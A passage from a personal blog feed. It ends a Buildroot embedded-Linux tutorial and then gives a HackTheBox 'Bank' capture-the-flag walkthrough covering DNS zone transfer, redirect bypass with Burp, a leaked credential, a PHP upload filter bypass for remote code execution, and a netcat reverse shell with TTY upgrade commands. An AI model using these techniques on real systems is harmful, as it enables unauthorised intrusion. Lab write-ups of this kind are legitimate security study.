    &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;System configuration  &lt;span class=&quot;nt&quot;&gt;---&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;     &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;buildroot-ef&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; System &lt;span class=&quot;nb&quot;&gt;hostname&lt;/span&gt;
             &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Welcome to Emmets Buildroot&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; System banner
             &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Enable root login with password
             &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;password123&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; Root password
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;Disable kernel since we built our own
    &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Kernel  &lt;span class=&quot;nt&quot;&gt;---&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Linux Kernel
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;Enable several packages
    &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Networking applications  &lt;span class=&quot;nt&quot;&gt;---&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;	&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; dhcpcd
                             &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; openssh
Text editors and viewers  &lt;span class=&quot;nt&quot;&gt;---&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; 	&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; nano
                             &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;   optimize &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;size
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;h2 id=&quot;build-the-root-filesystem&quot;&gt;Build the root filesystem&lt;/h2&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;emmet@homepc:/home/emmet/Documents/buildroot&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;make
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;Error&lt;/strong&gt;: If the build throws up an error then copy the relevant files illustrated in the error message into &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;buildroot/output/images/&lt;/code&gt; directory. If the directory doesn’t exist then create it. The build files will be in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;output/images/&lt;/code&gt; directory so the next stage is to flash partition 2 of the SD card with the root filesystem. Check where your block device resides before flashing as you may destroy your disk:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;emmet@homepc:/home/emmet/Documents/buildroot&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;fdisk &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt;
Device     Boot   Start      End  Sectors  Size Id Type
/dev/sdb1  &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;       2048  2086911  2084864 1018M  c W95 FAT32 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;LBA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
/dev/sdb2       2086912 15564799 13477888  6.4G 83 Linux

emmet@homepc:/home/emmet/Documents/buildroot&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo dd &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;output/images/rootfs.ext4 &lt;span class=&quot;nv&quot;&gt;of&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/dev/sdb2
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h1 id=&quot;booting-up-the-custom-linux-os&quot;&gt;Booting up the custom Linux OS&lt;/h1&gt;

&lt;p&gt;Unmount, eject and place the SD card into the Beaglebone Black. The serial console will now show the operating system booting up a lightweight custom embedded Linux distribution.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://github.com/pages/efriel94/ef_blog/assets/img/embedded/bb-linux/buildroot.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;</content><author><name>Emmet Friel</name></author><category term="embedded" /><summary type="html">Introduction</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:8000/ef_blog/embedded/bb-linux/linux.jpg" /><media:content medium="image" url="http://localhost:8000/ef_blog/embedded/bb-linux/linux.jpg" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">HackTheBox Walkthrough - Bank</title><link href="http://localhost:8000/ef_blog/hackthebox/bank.html" rel="alternate" type="text/html" title="HackTheBox Walkthrough - Bank" /><published>2020-04-16T00:00:00-07:00</published><updated>2020-04-16T00:00:00-07:00</updated><id>http://localhost:8000/ef_blog/hackthebox/bank</id><content type="html" xml:base="http://localhost:8000/ef_blog/hackthebox/bank.html">&lt;h1 id=&quot;introduction&quot;&gt;Introduction&lt;/h1&gt;
&lt;p&gt;Bank is an “easy” machine on HackTheBox. This box was a fairly steep learning curve albeit there was a alot of important takeways being the DNS enumeration, Virtual Host Routing check, modifying HTTP response headers to stop redirecting webpages and the RCE technique.&lt;/p&gt;

&lt;h1 id=&quot;recon-and-enumeration&quot;&gt;Recon and Enumeration&lt;/h1&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Documents/boxes/bank#  nmap &lt;span class=&quot;nt&quot;&gt;-sC&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sV&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-oA&lt;/span&gt; nmap.nmap 10.10.10.29
Starting Nmap 7.80 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2020-04-14 13:08 BST
Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;bank.htb &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;10.10.10.29&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.031s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
Not shown: 997 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu Linux&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; protocol 2.0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
| ssh-hostkey: 
|   1024 08:ee:d0:30:d5:45:e4:59:db:4d:54:a8:dc:5c:ef:15 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;DSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
|   2048 b8:e0:15:48:2d:0d:f0:f1:73:33:b7:81:64:08:4a:91 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;RSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
|   256 a0:4c:94:d1:7b:6e:a8:fd:07:fe:11:eb:88:d5:16:65 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ECDSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
|_  256 2d:79:44:30:c8:bb:5e:8f:07:cf:5b:72:ef:a1:6d:67 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ED25519&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
53/tcp open  domain  ISC BIND 9.9.5-3ubuntu0.14 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu Linux&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
| dns-nsid: 
|_  bind.version: 9.9.5-3ubuntu0.14-Ubuntu
80/tcp open  http    Apache httpd 2.4.7 &lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;
|_http-server-header: Apache/2.4.7 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
| http-title: HTB Bank - Login
|_Requested resource was login.php
Service Info: OS: Linux&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
Nmap &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;: 1 IP address &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 host up&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; scanned &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;16.52 seconds
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Normally DNS is UDP by default but falls back to TCP when the packet size is too large (&amp;gt;512 bytes). &lt;strong&gt;When will UDP exceed 512 bytes?&lt;/strong&gt; Classically speaking, in a zone transfer where one DNS server sends its entire database (resource records) to another machine, usually another DNS server. Although with the rise of IPv6, spam detection and DNSSEC, TCP is increasingly being used. Usually a zone transfer is normal operation between primary and secondary DNS servers in order to synchronise the records for a domain. This is typically not something you want to be accessed externally because if an attacker can gather all your DNS records, they can use those to select targets for exploitation. &lt;a href=&quot;https://hackertarget.com/zone-transfer/&quot; target=&quot;_blank_&quot;&gt;Zone Transfers&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;A useful website that highlights the security risk of having zone transfer enabled and how it can leak sensitive information: &lt;a href=&quot;https://digi.ninja/projects/zonetransferme.php&quot; target=&quot;_blank_&quot;&gt;digi.ninja&lt;/a&gt;&lt;/p&gt;

&lt;h1 id=&quot;dns-enumeration---nslookup&quot;&gt;DNS Enumeration - NSLookup&lt;/h1&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:/etc# nslookup 
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; SERVER 10.10.10.29
Default server: 10.10.10.29
Address: 10.10.10.29#53
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; 
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; 10.10.10.29
&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt; server cant find 29.10.10.10.in-addr.arpa: NXDOMAIN  &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;NO REVERSE DNS LOOKUP&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; 
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; 127.0.0.1
1.0.0.127.in-addr.arpa  name &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; localhost. &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;DIDN’T GET LUCKY WITH A HOSTNAME&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; 
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; bank.htb
Server:         10.10.10.29
Address:        10.10.10.29#53

Name:   bank.htb
Address: 10.10.10.29
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The default name server for all HackTheBox machines is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;lt;name of box&amp;gt;.htb&lt;/code&gt; so I tried that and got a response.&lt;/p&gt;

&lt;h1 id=&quot;dns-enumeration---dig&quot;&gt;DNS Enumeration - dig&lt;/h1&gt;

&lt;p&gt;The name server will be checked for a zone transfer of the target domain. It is often the case that even though the primary name server blocks zone transfers, a secondary or tertiary system may not be configured to block these - hence the check of each name server.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:/etc# dig axfr &amp;lt;targetdomain.com&amp;gt; @&amp;lt;ns1.targetdomain.com&amp;gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;syntax&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
root@kali:/etc# dig axfr @10.10.10.29 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Root zone transfer – didnt give anything away&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
root@kali:/etc# dig axfr bank.htb @10.10.10.29 

&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &amp;lt;&amp;lt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; DiG 9.11.14-3-Debian &amp;lt;&amp;lt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; axfr bank.htb @10.10.10.29
&lt;span class=&quot;p&quot;&gt;;;&lt;/span&gt; global options: +cmd
bank.htb.               604800  IN      SOA     bank.htb. chris.bank.htb. 2 604800 86400 2419200 604800
bank.htb.               604800  IN      NS      ns.bank.htb.
bank.htb.               604800  IN      A       10.10.10.29
ns.bank.htb.            604800  IN      A       10.10.10.29
www.bank.htb.           604800  IN      CNAME   bank.htb.
bank.htb.               604800  IN      SOA     bank.htb. chris.bank.htb. 2 604800 86400 2419200 604800
&lt;span class=&quot;p&quot;&gt;;;&lt;/span&gt; Query &lt;span class=&quot;nb&quot;&gt;time&lt;/span&gt;: 27 msec
&lt;span class=&quot;p&quot;&gt;;;&lt;/span&gt; SERVER: 10.10.10.29#53&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;10.10.10.29&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;;;&lt;/span&gt; WHEN: Tue Apr 14 15:11:26 BST 2020
&lt;span class=&quot;p&quot;&gt;;;&lt;/span&gt; XFR size: 6 records &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;messages 1, bytes 171&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Added &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;10.10.10.29 bank.htb&lt;/code&gt; to the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/hosts&lt;/code&gt; file and I was able to resolve bank.htb.&lt;/p&gt;

&lt;h1 id=&quot;enumeration--webpage&quot;&gt;Enumeration – Webpage&lt;/h1&gt;

&lt;p&gt;Navigating to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http://bank.htb/&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://github.com/pages/efriel94/ef_blog/assets/img/htb/bank/bank-htb.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Using the dirsearch tool I ran a scan to check for additional php files on the webserver. The tool is similar to dirb but dirsearch has alot of additional features.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:/opt/OSCP_tools/dirsearch# python3 dirsearch.py &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; http://bank.htb/ &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; php &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-t&lt;/span&gt; 20 

&lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt;: URL
&lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt;: wordlist
&lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt;: php extensions
&lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt;: follow redirects
&lt;span class=&quot;nt&quot;&gt;-t&lt;/span&gt;: 20 threads
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;While that was running I ran a Nikto scan that showed the page was being redirected to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/login.php&lt;/code&gt; and you can verify this by using CURL to get the HTTP headers.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Documents/boxes/bank# curl &lt;span class=&quot;nt&quot;&gt;-I&lt;/span&gt; http://bank.htb/
HTTP/1.1 302 Found
Date: Tue, 14 Apr 2020 15:00:35 GMT
Server: Apache/2.4.7 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
X-Powered-By: PHP/5.5.9-1ubuntu4.21
Set-Cookie: &lt;span class=&quot;nv&quot;&gt;HTBBankAuth&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;s1j3ugpbim98kouf2o3b69p925&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;path&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate, post-check&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0, pre-check&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0
Pragma: no-cache
location: login.php
Content-Type: text/html
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The response shows a HTTP 302 redirect to location login.php. The result of the dirsearch scan:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:/opt/OSCP_tools/dirsearch# python3 dirsearch.py &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; http://bank.htb/ &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; php &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-t&lt;/span&gt; 20
                        
  _|. _ _  _  _  _ _|_    v0.3.9
&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;_| | | _&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;/_&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;_|| &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;_| &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;

Extensions: php | HTTP method: get | Threads: 20 | Wordlist size: 441041

Error Log: /opt/OSCP_tools/dirsearch/logs/errors-20-04-14_15-54-45.log

Target: http://bank.htb/

&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;15:54:45] Starting: 
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;15:54:45] 403 -  279B  - /.php
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;15:54:45] 302 -    7KB - /index.php  -&amp;gt;  login.php
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;15:54:45] 200 -    2KB - /login.php
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;15:54:45] 302 -    3KB - /support.php  -&amp;gt;  login.php
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;15:54:46] 403 -  281B  - /icons/
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;15:54:46] 403 -  283B  - /uploads/
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;15:54:47] 200 -    2KB - /assets/
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;15:54:50] 302 -    0B  - /logout.php  -&amp;gt;  index.php
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;15:54:54] 200 -    1KB - /inc/
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;16:00:44] 403 -  289B  - /server-status/
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;16:06:47] 200 -  248KB - /balance-transfer/

Task Completed
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The output of dirsearch shows a few redirects occuring so I can stop these redirects using Burpsuite.&lt;/p&gt;

&lt;h1 id=&quot;stopping-redirects-using-burpsuite&quot;&gt;Stopping Redirects using Burpsuite&lt;/h1&gt;

&lt;p&gt;I’m going to stop the index.php redirect first of all and to perform this, catch the initial request and then go to Actions –&amp;gt; Do intercept –&amp;gt; Response to this request then replace &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;HTTP/1.1 302 Found&lt;/code&gt; with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;HTTP/1.1 200 OK&lt;/code&gt; and then forward. To do this automatically for every page, from the proxy tab at the top go to options then “Match and Replace”, put in your rule, make sure its enabled and then turn intercept off. The rule you can see below.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://github.com/pages/efriel94/ef_blog/assets/img/htb/bank/replace302.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;

&lt;p&gt;You can navigate to all websites now without being redirected, one in particular was an unrendered support.php page which gives us the ability to upload files. With some trial and error I could get an image uploaded successfully with php code encapsulated however I couldnt get any RCE on the webpage and also I fired up burp to see WTH was going on and it seems the webpage kept trying to redirect to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;login.php&lt;/code&gt; after uploading the images which seemed strange considering we created that rule. The webpage wouldn’t let me delete the files so I tried searching elsewhere in the meantime.&lt;/p&gt;

&lt;h1 id=&quot;further-enumeration-of-the-webpage&quot;&gt;Further Enumeration of the Webpage&lt;/h1&gt;

&lt;p&gt;&lt;img src=&quot;https://github.com/pages/efriel94/ef_blog/assets/img/htb/bank/balance-transfer.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;

&lt;p&gt;On this directory there is a load of encrypted files so I downloaded everything using wget and then sorted the files by filesize in reverse order. All the files were around the same size except one.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Documents/boxes/bank/# wget &lt;span class=&quot;nt&quot;&gt;-r&lt;/span&gt; http://bank.htb/balance-transfer/
root@kali:~/Documents/boxes/bank/bank.htb/balance-transfer# &lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-lah&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;sort&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-r&lt;/span&gt;
root@kali:~/Documents/boxes/bank/bank.htb/balance-transfer# &lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;68576f20e9732f1b2edc4df5b8533230.acc
&lt;span class=&quot;nt&quot;&gt;--ERR&lt;/span&gt; ENCRYPT FAILED
+&lt;span class=&quot;o&quot;&gt;=================&lt;/span&gt;+
| HTB Bank Report |
+&lt;span class=&quot;o&quot;&gt;=================&lt;/span&gt;+

&lt;span class=&quot;o&quot;&gt;===&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;UserAccount&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;===&lt;/span&gt;
Full Name: Christos Christopoulos
Email: chris@bank.htb
Password: &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;c&quot;&gt;##HTBB4nkP4ssw0rd!##&lt;/span&gt;
CreditCards: 5
Transactions: 39
Balance: 8842803 &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;===&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;UserAccount&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;===&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Logged into the portal using the email and password, navigated to &lt;strong&gt;“Support”&lt;/strong&gt; and I came to the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;support.php&lt;/code&gt; page which I was enumerating earlier, this time the webpage was correctly rendered so I may have better luck this time. I uploaded a GIF file with php code in it (test.gif.php) and the response was declined as it only allows images. I fired up burp to see the response and I came across something interesting. I changed the extension to htb and tried again. Success, it uploaded and I had RCE (remote code execution).&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://github.com/pages/efriel94/ef_blog/assets/img/htb/bank/debug.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;

&lt;h1 id=&quot;shell-access&quot;&gt;Shell Access&lt;/h1&gt;

&lt;p&gt;Having RCE, its time to get a shell into the machine. I setup my listener and connected back to my machine using netcat. You can check whether the victim has nc installed by running: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;?cmd=which nc&lt;/code&gt;&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;&lt;img src=&quot;https://github.com/pages/efriel94/ef_blog/assets/img/htb/bank/rce.png&quot; alt=&quot;image&quot; /&gt;&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;em&gt;Executing commands as user www-data&lt;/em&gt;&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;That sigh of relief once you catch that reverse shell makes all the work worth it but I’d rather much operate in a fully interactive TTY shell so its time to upgrade.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;python &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'import pty;pty.spawn(&quot;/bin/bash&quot;)'&lt;/span&gt;
www-data@bank:/var/www/bank/uploads&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;
www-data@bank:/var/www/bank/uploads&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;^Z  &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;CTRL+Z MOVE IT TO THE BACKGROUND&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;1]+  Stopped                 nc &lt;span class=&quot;nt&quot;&gt;-lvnp&lt;/span&gt; 443
root@kali:~/Documents/boxes/bank# &lt;span class=&quot;nb&quot;&gt;stty &lt;/span&gt;raw &lt;span class=&quot;nt&quot;&gt;-echo&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Type &lt;span class=&quot;nb&quot;&gt;fg &lt;/span&gt;and &lt;span class=&quot;k&quot;&gt;then &lt;/span&gt;hit ENTER&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
root@kali:~/Documents/boxes/bank# nc &lt;span class=&quot;nt&quot;&gt;-lvnp&lt;/span&gt; 443
www-data@bank:/var/www/bank/uploads&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;
